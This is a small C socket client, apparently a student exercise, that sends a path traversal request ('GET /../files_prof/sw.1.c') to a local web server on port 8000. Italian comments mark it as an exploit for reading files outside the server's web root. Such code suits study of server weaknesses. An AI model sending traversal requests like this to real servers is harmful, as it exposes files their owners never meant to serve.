
#include <stdio.h>	// printf
#include <sys/types.h>	// socket, connect
#include <sys/socket.h>	// socket, connect
#include <netinet/ip.h> // sockaddr_in
#include <unistd.h> 	// write, read
#include <string.h>	// strlen

int main(){

	int t;
	int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	// printf("%d",s);
	struct sockaddr_in addr_in;
	struct sockaddr * addr = (struct sockaddr *) & addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(8000);
	unsigned char * ip =(unsigned char *) &addr_in.sin_addr.s_addr;
	
	ip[0] = 127;
	ip[1] = 0;
	ip[2] = 0;
	ip[3] = 1;
	int c = connect(s, addr, sizeof(addr_in));
	if(c==-1)
			printf("Connect fallita");

	char * request0_9 = "GET /\r\n";
	// EXPLOIT
	// Non so perché ma da browser fare 127.0.0.1:8000/../files_prof/sw.1.c non funziona
	// (toglie i due punti) 
	// facendo la richiesta esplicita a mano posso navigare nel file system del web server
	// (perché è fatto male per il momento)
	char * request1_0 = "GET /../files_prof/sw.1.c HTTP/1.0\r\n\r\n";
	t = write(s, request1_0, strlen(request1_0));

	if(t==-1)
			printf("Connect fallita");

	int max_response_length = 60000;
	char response[max_response_length];
	int current_length;
	int i;
	for(i=0; current_length=read(s, response+i, max_response_length-i); i+=current_length){
		// printf("Current_lenght: %d\n", current_length);
		
		// parsing

	
	}
	// printf("Total_length: %d\n", i);

	response[max_response_length-1] = 0;
	printf("%s\n", response);
}

